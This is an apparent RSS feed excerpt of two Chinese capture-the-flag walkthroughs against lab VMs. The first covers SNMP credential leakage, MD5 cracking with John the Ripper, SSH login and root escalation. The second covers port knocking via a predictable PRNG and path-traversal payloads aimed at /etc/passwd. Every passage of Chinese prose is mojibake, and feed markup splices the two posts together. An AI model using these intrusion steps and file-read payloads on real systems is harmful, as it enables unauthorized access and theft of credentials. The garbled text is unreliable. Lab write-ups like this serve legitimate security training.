Êé•ÁùÄÔºåËÆøÈóÆ 80 Á´ØÂè£ÁöÑ Web ÊúçÂä°ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Ê®°‰ªø Kali Linux ÁªàÁ´ØÁöÑÈùôÊÄÅÈ°µÈù¢ÔºåÊú™ÂèëÁé∞Áõ¥Êé•ÂèØÂà©Áî®ÁöÑÂäüËÉΩ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 192.168.205.161       
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
...
```

‰ΩøÁî® `dirsearch` Âíå `gobuster` ÂØπÁΩëÁ´ôÁõÆÂΩïËøõË°åÊâ´ÊèèÔºåÊú™ÂèëÁé∞Èô§‰∏ªÈ°µÂ§ñÁöÑÂÖ∂‰ªñÊúâÁî®Ë∑ØÂæÑ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ dirsearch -u http://192.168.205.161               
...
Task Completed
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ gobuster dir -u 192.168.205.161 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
...
/index.html           (Status: 200) [Size: 15740]
...
```

Áî±‰∫é TCP Êâ´ÊèèÊú™ÂèëÁé∞ÊòéÊòæÁ™ÅÁ†¥Âè£ÔºåÊé•‰∏ãÊù•ÂØπÁõÆÊ†áËøõË°å UDP Êâ´ÊèèÔºåÂØªÊâæÂÖ∂‰ªñÂèØËÉΩÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nmap -sU --top-port 100 192.168.205.161
...
PORT    STATE SERVICE
161/udp open  snmp
...
```

UDP Êâ´ÊèèÂèëÁé∞ **161 (SNMP)** Á´ØÂè£ÂºÄÊîæÔºåËøôÊòØ‰∏Ä‰∏™ÂÖ≥ÈîÆÂèëÁé∞„ÄÇSNMP ÊúçÂä°Â∏∏Âõ†ÈÖçÁΩÆ‰∏çÂΩìËÄåÊ≥ÑÈú≤Â§ßÈáèÊïèÊÑü‰ø°ÊÅØ„ÄÇ

## ‰∫å„ÄÅSNMP ‰ø°ÊÅØÊ≥ÑÈú≤‰∏éÊºèÊ¥ûÂà©Áî®

Â∞ùËØï‰ΩøÁî®ÈªòËÆ§ÁöÑ community string `public` Êù•ËØªÂèñ SNMP ‰ø°ÊÅØ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ snmpwalk -v2c -c public 192.168.205.161
...
```

`snmpwalk` ËøîÂõû‰∫ÜÊµ∑Èáè‰ø°ÊÅØ„ÄÇ‰∏∫‰∫ÜÂø´ÈÄüÂÆö‰ΩçÊúâÁî®Êï∞ÊçÆÔºå‰ΩøÁî® `grep` ËøáÊª§ÂåÖÂê´ `pass` ÁöÑË°å„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ snmpwalk -v2c -c public 192.168.205.161|grep 'pass'
iso.3.6.1.2.1.25.4.2.1.4.331 = STRING: 'leak-service --login Shinozaki --pass ShinozakiAi'
iso.3.6.1.2.1.25.6.3.1.2.13 = STRING: 'base-passwd_3.5.46_amd64'
iso.3.6.1.2.1.25.6.3.1.2.480 = STRING: 'passwd_1:4.5-1.1_amd64'
```

Âú®Á≥ªÁªüËøõÁ®ã‰ø°ÊÅØ‰∏≠ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÊÉä‰∫∫ÁöÑ‰ø°ÊÅØÊ≥ÑÈú≤Ôºö‰∏Ä‰∏™Âêç‰∏∫ `leak-service` ÁöÑÊúçÂä°ÂêØÂä®Êó∂Ôºå‰ª•ÊòéÊñáÂΩ¢Âºè‰º†ÈÄí‰∫ÜÁôªÂΩïÂá≠ËØÅ `Shinozaki:ShinozakiAi`„ÄÇ

ÂêåÊó∂ÔºåÂú® `snmpwalk` ÁöÑËæìÂá∫‰∏≠ËøòÂèëÁé∞‰∫ÜÂüüÂêç‰ø°ÊÅØ `admin@sunset.leak.dsz`„ÄÇÂ∞Ü `leak.dsz` Âíå `sunset.leak.dsz` Ê∑ªÂä†Âà∞Êú¨Âú∞ `/etc/hosts` Êñá‰ª∂‰∏≠Ôºå‰ª•‰æøÂêéÁª≠ÊµãËØï„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sudo vim /etc/hosts             
...
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ tail -n 1 /etc/hosts                                    
192.168.205.161 leak.dsz sunset.leak.dsz
```

ÂÜçÊ¨°ÂØπÊñ∞ÂèëÁé∞ÁöÑÂüüÂêçËøõË°åÁõÆÂΩïÊâ´ÊèèÔºå`sunset.leak.dsz` ÂüüÂêç‰∏ãÂèëÁé∞‰∫Ü‰∏Ä‰∏™ `/manager` Ë∑ØÂæÑÔºåËÆøÈóÆÂêéÈúÄË¶ÅËÆ§ËØÅ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ dirsearch -u http://sunset.leak.dsz 
...
[05:56:17] 301 -  320B  - /manager  -&gt;  http://sunset.leak.dsz/manager/
[05:56:17] 401 -   24B  - /manager/
...
```

ÊòØ‰∏Ä‰∏™ÁôªÂΩïÁ™óÂè£„ÄÇ‰ΩøÁî®ÂâçÈù¢Ê≥ÑÈú≤ÁöÑÂá≠ËØÅ `Shinozaki:ShinozakiAi` Â∞ùËØïÁôªÂΩïÔºåÊàêÂäüËøõÂÖ•ÂêéÂè∞„ÄÇÂú®ÂêéÂè∞È°µÈù¢‰∏≠ÔºåÂèëÁé∞‰∫ÜsshÁî®Êà∑ `ai` ÁöÑÂØÜÁ†Å MD5 ÂìàÂ∏å„ÄÇ

![image-20250701180035946](https://7r1umphk.github.io/image/20250701180036271.webp)

- **Áî®Êà∑:** `ai`
- **MD5 Hash:** `d21715210cb6224f9ff4c075a8906fe9`

## ‰∏â„ÄÅËé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôê

Áé∞Âú®ÔºåÊàë‰ª¨ÈúÄË¶ÅÁ†¥Ëß£Ëøô‰∏™ MD5 ÂìàÂ∏å„ÄÇÊ†πÊçÆÈ°µÈù¢ÊèêÁ§∫Ôºå‰ΩøÁî® `crunch` ÁîüÊàê‰∏Ä‰∏™‰ª• `baba` ÂºÄÂ§¥ÁöÑ8‰ΩçÂØÜÁ†ÅÂ≠óÂÖ∏„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ crunch 8 8 -t baba@@@@ -o wordlist.txt
...
```

Â∞ÜÂìàÂ∏å‰øùÂ≠òÂà∞Êñá‰ª∂ `hash` ‰∏≠ÔºåÂπ∂‰ΩøÁî® `John the Ripper` ÂíåÂàöÁîüÊàêÁöÑÂ≠óÂÖ∏ËøõË°åÁ†¥Ëß£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat hash                              
ai:d21715210cb6224f9ff4c075a8906fe9
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ john --format=raw-md5 --wordlist=wordlist.txt hash
...
babadawo         (ai)     
...
Session completed. 
```

ÊàêÂäüÁ†¥Ëß£ÂØÜÁ†Å‰∏∫ `babadawo`„ÄÇ

‰ΩøÁî®Ëé∑ÂèñÂà∞ÁöÑÂá≠ËØÅ `ai:babadawo` Â∞ùËØï SSH ÁôªÂΩï„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ssh ai@192.168.205.161
ai@192.168.205.161's password: 
...
Last login: Tue Jul  1 05:13:09 2025 from 192.168.205.128
ai@Leak:~$
```

ÁôªÂΩïÊàêÂäüÔºÅÁé∞Âú®Ëé∑Âèñ `user.txt`„ÄÇ

```bash
ai@Leak:~$ cat user.txt 
flag{user-13421fec-559d-11f0-a1af-5f1558743b4d}
```

ÊàêÂäüÊãøÂà∞Áî®Êà∑ flag„ÄÇ

## Âõõ„ÄÅÊùÉÈôêÊèêÂçá

‰∏∫‰∫ÜÊèêÂçáÊùÉÈôêÔºåÈ¶ñÂÖàÊü•ÁúãÂΩìÂâçÁ≥ªÁªü‰∏äÂÆâË£ÖÁöÑËΩØ‰ª∂ÂåÖÔºåÁâπÂà´ÊòØÂØªÊâæÈùûÊ†áÂáÜÁöÑÊàñËá™ÂÆö‰πâÁöÑÂåÖ„ÄÇ

```bash
ai@Leak:~$ dpkg -l |grep 'leak'
ii  leak-date                     1.0-1                                       amd64        Simple date and time display utility
ii  liblsan0:amd64                10.2.1-6                                    amd64        LeakSanitizer -- a memory leak detector (runtime)
```

ÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `leak-date` ÁöÑÂèØÁñëËΩØ‰ª∂ÂåÖ„ÄÇÊü•ÁúãÂÖ∂ËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇ

```bash
ai@Leak:~$ dpkg -s leak-date
Package: leak-date
Status: install ok installed
Priority: optional
Section: utils
Installed-Size: 500
Maintainer: Security Admin &lt;admin@leak.dsz&gt;
Architecture: amd64
Version: 1.0-1
Description: Simple date and time display utility
 This package provides a minimal CLI utility to display
 the current system date and time. Ideal for scripts and
 system monitoring. SECURITY NOTICE: System debug token
 IMKCFRunLoopWakeUpReliable for root access.
```

Âú®ËΩØ‰ª∂ÂåÖÁöÑÊèèËø∞‰ø°ÊÅØ‰∏≠ÔºåÂèëÁé∞‰∫Ü‰∏ÄÊù°Ëá≥ÂÖ≥ÈáçË¶ÅÁöÑÂÆâÂÖ®ÊèêÁ§∫Ôºö`SECURITY NOTICE: System debug token IMKCFRunLoopWakeUpReliable for root access.`„ÄÇËøô‰∏≤Â≠óÁ¨¶ `IMKCFRunLoopWakeUpReliable` ÊûÅÊúâÂèØËÉΩÂ∞±ÊòØ root Áî®Êà∑ÁöÑÂØÜÁ†Å„ÄÇ

‰ΩøÁî® `su -` ÂàáÊç¢Âà∞ root Áî®Êà∑ÔºåÂπ∂ËæìÂÖ•Ëøô‰∏≤Â≠óÁ¨¶‰Ωú‰∏∫ÂØÜÁ†Å„ÄÇ

```bash
ai@Leak:~$ su - 
Password: 
root@Leak:~#
```

ÊàêÂäüÂàáÊç¢Âà∞ root Áî®Êà∑ÔºÅÁé∞Âú®ËØªÂèñÊúÄÁªàÁöÑ root flag„ÄÇ

```bash
root@Leak:~# cat /root/root.txt 
flag{root-357d3d08-5598-11f0-a27e-639fd7e7110b}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Leak.html</guid><pubDate>Tue, 01 Jul 2025 11:09:43 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_yulian</title><link>https://7r1UMPHK.github.io/post/nei-bu-_yulian.html</link><description>![image-20250627200158237](https://7r1umphk.github.io/image/image20250627200158372.webp)

Áæ§ÂÜÖÈù∂Êú∫

ÂºÄÊêû

## ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ‰∏éÂèëÁé∞

Ê∏óÈÄèÊµãËØïÁöÑÁ¨¨‰∏ÄÊ≠•Ê∞∏ËøúÊòØ‰ø°ÊÅØÊî∂ÈõÜ„ÄÇÊàë‰ª¨È¶ñÂÖàÈúÄË¶ÅÁ°ÆÂÆöÁõÆÊ†áÂú®ÁΩëÁªú‰∏≠ÁöÑ‰ΩçÁΩÆ„ÄÇ

### 1.1 ‰∏ªÊú∫ÂèëÁé∞

Êàë‰ª¨Â§Ñ‰∫é `192.168.205.0/24` ÁΩëÊÆµÔºå‰ΩøÁî® `arp-scan` ÂØπÊï¥‰∏™CÊÆµËøõË°åÊâ´ÊèèÔºå‰ª•ÂèëÁé∞Â≠òÊ¥ªÁöÑ‰∏ªÊú∫„ÄÇ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l                      
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.131 08:00:27:0f:fa:c2       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f3:f6:bb       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.038 seconds (125.61 hosts/sec). 4 responded
                 
```

ÊàêÂäüÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.131`„ÄÇ

### 1.2 Á´ØÂè£Êâ´Êèè

Á°ÆÂÆöIPÂêéÔºå‰ΩøÁî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÊé¢ÊµãÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:02 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00046s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8080/tcp filtered http-proxy
MAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.23 seconds
                                                    
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåSSHÔºà22Á´ØÂè£ÔºâÂíåHTTPÔºà80Á´ØÂè£ÔºâÊúçÂä°ÊòØÂºÄÊîæÁöÑÔºåËÄå8080ÂÖ≥Èó≠ÔºàÊàëÊú¨Ë∫´ËØ¥Êù•ËØï‰∏Ä‰∏ãLingMjÁöÑÂéãÊµãÂ§ßÊ≥ïÔºåÁªìÊûú‰∏çË°åÔºâÔºåÈÇ£Áúã80

## ‰∫å„ÄÅÁ´ØÂè£Êï≤Èó®‰∏éÊúçÂä°Êö¥Èú≤

ËÆøÈóÆ80Á´ØÂè£ÁöÑWebÊúçÂä°ÔºåÊàë‰ª¨ÂèëÁé∞‰∏Ä‰∏™Ê®°ÊãüÁöÑLinuxÁªàÁ´ØÁïåÈù¢„ÄÇ

![image-20250627200436415](https://7r1umphk.github.io/image/image20250627200436564.webp)

ÁúãÂà∞ËøôÂ∞±ÊúâÁÇπÂÅá‰∫ÜÔºåÊâÄ‰ª•Áõ¥Êé•ÁúãÊ∫êÁ†ÅÂêß

```
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
  &lt;meta charset='UTF-8'&gt;
  &lt;title&gt;Linux Terminal Simulator&lt;/title&gt;
  &lt;style&gt;
    body {
      background-color: #000;
      color: #00ff00;
      font-family: monospace;
      margin: 0;
      padding: 10px;
    }
    #terminal {
      white-space: pre-wrap;
      min-height: 90vh;
      overflow-y: auto;
    }
    .line {
      display: flex;
      flex-wrap: wrap;
    }
    input {
      background: none;
      border: none;
      color: #00ff00;
      font-family: monospace;
      font-size: 1em;
      outline: none;
      flex: 1;
    }
    ::selection {
      background: #008000;
    }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div id='terminal'&gt;&lt;/div&gt;

  &lt;script&gt;
    const terminal = document.getElementById('terminal');

    const fileSystem = {
      'home': {
        'user': {
          'file1.txt': 'Hello, this is file1.',
          'notes.md': '# Notes\nThis is a markdown file.'
        }
      },
      'var': {
        'log.txt': 'System log content here.'
      },
      'opt':{
        'code':{
            'test.c':`#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
        srand(114514);
        for(int i = 0; i &lt; 114514; i++)
        {
                rand();
        }
        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);


        return 0;
}`
        }
      }

    };

    let currentPath = ['home', 'user'];
    let history = [];
    let historyIndex = -1;

    function getDir(pathArr, fs) {
      let node = fs;
      for (let part of pathArr) {
        if (node[part] &amp;&amp; typeof node[part] === 'object') {
          node = node[part];
        } else {
          return null;
        }
      }
      return node;
    }

    function getPathString() {
      return '/' + currentPath.join('/');
    }

    function renderPrompt() {
      return `user@linux:${getPathString()}$ `;
    }

    function printOutput(prompt, input, output) {
      const block = document.createElement('div');
      block.innerHTML = `
        &lt;div&gt;${prompt}${input}&lt;/div&gt;
        &lt;div&gt;${output}&lt;/div&gt;
      `;
      terminal.appendChild(block);
    }

    function createInputLine() {
      const line = document.createElement('div');
      line.className = 'line';

      const promptSpan = document.createElement('span');
      promptSpan.textContent = renderPrompt();

      const input = document.createElement('input');
      input.type = 'text';
      input.autofocus = true;

      line.appendChild(promptSpan);
      line.appendChild(input);
      terminal.appendChild(line);

      input.focus();

      input.addEventListener('keydown', (e) =&gt; {
        if (e.key === 'Enter') {
          const value = input.value.trim();
          input.disabled = true;
          runCommand(value);
        } else if (e.key === 'ArrowUp') {
          if (historyIndex &gt; 0) {
            historyIndex--;
            input.value = history[historyIndex];
          }
        } else if (e.key === 'ArrowDown') {
          if (historyIndex &lt; history.length - 1) {
            historyIndex++;
            input.value = history[historyIndex];
          } else {
            input.value = '';
          }
        }
      });
    }

    function runCommand(input) {
      const prompt = renderPrompt();
      if (input !== '') {
        history.push(input);
        historyIndex = history.length;
      }

      function escapeHTML(str) {
            return str.replace(/&amp;/g, '&amp;amp;').replace(/&lt;/g, '&amp;lt;').replace(/&gt;/g, '&amp;gt;');
    }

      const args = input.split(' ');
      const cmd = args[0];
      const param = args.slice(1);
      const currentDir = getDir(currentPath, fileSystem);
      let output = '';

      switch (cmd) {
        case 'help':
          output = 'ÂëΩ‰ª§: help, clear, echo, ls, cd, cat, date';
          break;
        case 'clear':
          terminal.innerHTML = '';
          createInputLine();
          return;
        case 'echo':
          output = param.join(' ');
          break;
        case 'date':
          output = new Date().toString();
          break;
        case 'ls':
          if (currentDir) {
            output = Object.keys(currentDir).join('  ');
          } else {
            output = 'Êó†Ê≥ïËÆøÈóÆÂΩìÂâçÁõÆÂΩï';
          }
          break;
        case 'cd':
          if (param.length === 0 || param[0] === '~') {
            currentPath = ['home', 'user'];
          } else if (param[0] === '..') {
            if (currentPath.length &gt; 0) currentPath.pop();
          } else {
            const target = param[0];
            const newPath = [...currentPath, target];
            const targetDir = getDir(newPath, fileSystem);
            if (targetDir &amp;&amp; typeof targetDir === 'object') {
              currentPath = newPath;
            } else {
              output = `cd: Ê≤°ÊúâËøô‰∏™ÁõÆÂΩï: ${target}`;
            }
          }
          break;
        case 'cat':
          if (param.length === 0) {
            output = 'cat: ÈúÄË¶ÅÊñá‰ª∂ÂêçÂèÇÊï∞';
          } else {
            const file = param[0];
            if (currentDir[file] &amp;&amp; typeof currentDir[file] === 'string') {
              output = escapeHTML(currentDir[file]);
            } else {
              output = `cat: Êâæ‰∏çÂà∞Êñá‰ª∂ ${file}`;
            }
          }
          break;
        case '':
          output = '';
          break;
        default:
          output = `Êú™ÊâæÂà∞ÂëΩ‰ª§: ${cmd}`;
      }

      printOutput(prompt, input, output);
      createInputLine();
      terminal.scrollTop = terminal.scrollHeight;
    }

    // ÂàùÂßãÂåñ
    createInputLine();
    terminal.addEventListener('click', () =&gt; {
      const inputs = terminal.querySelectorAll('input');
      if (inputs.length &gt; 0) inputs[inputs.length - 1].focus();
    });
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

```

ÊâíÊãâÁöÑÊó∂ÂÄôÁúãÂà∞‰∫Ü‰∏Ä‰∏™Êñá‰ª∂/opt/code/test.cÔºåÂ§ÑÁêÜ‰∏Ä‰∏ãÂ∞±‰∏ãÈù¢ÈÇ£Ê†∑

```
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
        srand(114514); 
        for(int i = 0; i &lt; 114514; i++)
        {
                rand();
        }
        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);


        return 0;
}
```

ÂÅáÈöèÊú∫Êï∞

&gt; **‰º™ÈöèÊú∫Êï∞**
&gt;
&gt; ËÆ°ÁÆóÊú∫ÁîüÊàêÁöÑÈöèÊú∫Êï∞ÈÄöÂ∏∏ÊòØ‰º™ÈöèÊú∫ÁöÑÔºåÂÆÉ‰ª¨Áî±‰∏Ä‰∏™ÂàùÂßãÁöÑ‚ÄúÁßçÂ≠ê‚ÄùÔºàseedÔºâÈÄöËøáÁâπÂÆöÁÆóÊ≥ïÁîüÊàê„ÄÇÂ¶ÇÊûúÁßçÂ≠êÂõ∫ÂÆöÔºåÈÇ£‰πàÂêéÁª≠ÁîüÊàêÁöÑ‚ÄúÈöèÊú∫‚ÄùÊï∞Â∫èÂàó‰πüÊòØÂÆåÂÖ®Âõ∫ÂÆöÂíåÂèØÈ¢ÑÊµãÁöÑ„ÄÇ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nano test.c
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat test.c 
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
        srand(114514); 
        for(int i = 0; i &lt; 114514; i++)
        {
                rand();
        }
        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);


        return 0;
}
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ gcc test.c -o test
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ./test     
6440\n17226\n31925\n                                                             
```

ÁúãÂà∞Ëøô‰∏â‰∏™Êï∞Â§ßÊ¶ÇÁåúÂà∞Ë¶ÅÂπ≤Âòõ‰∫ÜÔºåÊï≤Èó®

&gt; **Á´ØÂè£Êï≤Èó®ÔºàPort KnockingÔºâ**
&gt;
&gt; ËøôÊòØ‰∏ÄÁßçÈÄöËøáÂêëÁõÆÊ†á‰∏ªÊú∫È¢ÑÂÖàÂÆö‰πâÂ•ΩÁöÑ‰∏ÄÁ≥ªÂàóÁ´ØÂè£ÂèëÈÄÅËØ∑Ê±ÇÔºà‚ÄúÊï≤Èó®‚ÄùÔºâÔºåÊù•Âä®ÊÄÅÂºÄÂêØÊüê‰∏™ÁâπÂÆöÊúçÂä°Á´ØÂè£ÁöÑÂÆâÂÖ®Êú∫Âà∂„ÄÇ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ knock 192.168.205.131 6440 17226 31925
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ knock 192.168.205.131 6440 17226 31925
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ knock 192.168.205.131 6440 17226 31925        
```

Êï≤Èó®Á®ãÂ∫èÊúâÊ¶ÇÁéáÊäΩÈ£éÔºåÊâÄ‰ª•Â§öÊï≤Âá†Ê¨°

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nmap -p- 192.168.205.131              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:11 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00065s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds                     
```

8080ÂºÄ‰∫ÜÔºåÂéªÁúã‰∏Ä‰∏ã

## ‰∏â„ÄÅWebÂ∫îÁî®Ê∏óÈÄèÔºö‰ªéLFIÂà∞RCE

![image-20250627201136754](https://7r1umphk.github.io/image/image20250627201136940.webp)

### 3.1 Âº±Âè£‰ª§ÁàÜÁ†¥‰∏éËÆ§ËØÅÁªïËøá

ÁôªÂΩïÔºåÂ∞ùËØïÂº±ÂØÜÁ†Å

![image-20250627201201451](https://7r1umphk.github.io/image/image20250627201201647.webp)

Áôª‰∏ç‰∏äÔºå‰ΩÜÊòØÁúãÂà∞‰∏Ä‰∏™Ë≤å‰ººÂèØ‰ª•Ê≥®ÂÖ•ÁöÑÂú∞ÊñπÔºåÁúãÁúãÊ∫êÁ†ÅÂÖà

```
&lt;!DOCTYPE html&gt;
&lt;html lang='zh-CN'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;title&gt;Áî®Êà∑ÁôªÂΩï&lt;/title&gt;
    &lt;style&gt;
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(to right, #74ebd5, #ACB6E5);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        .login-container h2 {
            text-align: center;
            margin-bottom: 24px;
            color: #333;
        }

        .login-container input[type='text'],
        .login-container input[type='password'] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
        }

        .login-container input[type='submit'] {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }

        .login-container input[type='submit']:hover {
            background-color: #45a049;
        }

        .message {
            color: red;
            text-align: center;
            margin-top: 10px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div class='login-container'&gt;
    &lt;h2&gt;ÁôªÂΩï&lt;/h2&gt;
    &lt;form method='post' action='/login'&gt;
        &lt;input type='text' name='username' placeholder='Áî®Êà∑Âêç' required&gt;
        &lt;input type='password' name='password' placeholder='ÂØÜÁ†Å' required&gt;
        &lt;input type='submit' value='ÁôªÂΩï'&gt;
    &lt;/form&gt;
    &lt;div class='message'&gt;
        &lt;!-- ÂêéÁ´ØÂèØ‰ª•ÈÄöËøáÈáçÂÆöÂêëÂèÇÊï∞ÊòæÁ§∫Â§±Ë¥•‰ø°ÊÅØ --&gt;
        &lt;span id='error-message'&gt;&lt;/span&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;script&gt;
    const urlParams = new URLSearchParams(window.location.search);
    const error = urlParams.get('error');
    if (error) {
        document.getElementById('error-message').innerText = decodeURIComponent(error);
    }
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

```

ÂÅáÁöÑÔºåÊú¨Âú∞ÂÆûÁé∞ÁöÑÔºå‰∏çÁÑ∂errorÂèØ‰ª•ÊµãËØï‰∏Ä‰∏ã{{7*7}}Ê®°ÊùøÊ≥®ÂÖ•

ÁàÜÁ†¥‰∏Ä‰∏ãÁõÆÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.131:8080/download                                                                                   
{'timestamp':'2025-06-27T12:14:39.104+0000','status':400,'error':'Bad Request','message':'Required String parameter 'file' is not present','path':'/download'}                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=../../../etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=....//....//....//etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=download'                                                            
&lt;h1&gt;Forbidden access                                                                                                                                             ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.131:8080/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
